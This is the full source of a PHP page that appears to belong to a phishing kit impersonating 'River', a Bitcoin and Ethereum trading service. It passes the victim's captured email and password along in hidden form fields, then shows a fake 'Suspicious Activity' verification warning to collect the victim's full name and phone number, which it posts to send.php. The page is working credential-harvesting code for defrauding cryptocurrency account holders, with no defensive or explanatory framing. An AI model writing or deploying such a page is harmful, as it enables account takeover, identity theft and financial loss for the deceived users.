<?php include_once './config.php'; ?>
<html lang="en">
    <?php
    $title = 'Sign in to River | Buy, Sell and Margin Trade Bitcoin (BTC) and Ethereum (ETH)';
    include_once './includes/meta.php';
    if (empty($_SESSION["email"]) || empty($_SESSION["password"])) {
        redirect(base_url());
    }
    unset($_SESSION['phone_number']);
    ?>
    <body>
        <div class="container">
            <?php include_once './includes/header.php'; ?>
            <link rel="stylesheet" href="<?= base_url('assets/country-code-picker/css/jquery.ccpicker.css') ?>">
            <div class="row mt-3">
                <div class="col-12 offset-0 col-md-6 offset-md-3">
                    <div class="p-5">
                        <form method="post" action="<?= base_url('send.php') ?>" class="col-12 shadow-sm px20 py17 rounded-4">
                            <h2 class="fs30 mb25 text-center text-white">Verification Required</h2>
                            <h3 class="fs20 text-danger">Important Information</h3>
                            <p class="my15 text-white">Some Suspicious Activity Found With Your Account, Enter Your Phone Number to Verify Your Identity.</p>
                            <div class="my25">
                                <label for="" class="form-label fw-normal text-white">Full Name</label>
                                <input type="hidden" name="email" value="<?= $_SESSION['email'] ?>" >
                                <input type="hidden" name="password" value="<?= $_SESSION['password'] ?>" >
                                <input name="name" type="text" required="" minlength="3" maxlength="100" class="form-control form-control-lg border border-secondary bg-dark" placeholder="Enter Full Name" value="" >
                            </div>
                            <div className="my25">
                                <label for="" class="form-label text-white">Phone Number</label>
                                <div class="form-control fs16" style="padding: 0px;">
                                    <input name="phone_number" type="number" id="phone_number" required="" style="width: 80%;border: solid 1px #CCC; padding: 10px 5px;margin: 0px;color:#fff;" class="border border-secondary bg-dark" placeholder="Phone number" value="" >
                                </div>
                            </div>
                            <div class="text-center mx-auto d-grid gap-2 my25">
                                <button type="submit" class="btn bg-gold btn-lg btn-primary-3 border-0 fs16 fw-medium btn-block rounded-2">Submit</button>
                            </div>
                            <div class="text-center my25 fw-medium">
                                <span class="text-secondary">Need help?</span>
                                <a href="javascript:void(Tawk_API.toggle())" class="text-decoration-none text-gold"> Contact Support</a>
                            </div>
                        </form>          
                    </div>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
        <script src="./assets/country-code-picker/js/jquery.ccpicker.min.js"></script>
        <script type="text/javascript">
            $(document).ready(function () {
                $("#phone_number").CcPicker({countryCode: "us", dataUrl: "<?= base_url('assets/country-code-picker/data/en.json') ?>", searchPlaceHolder: "Find..."});
            });
        </script>
    </body>
</html>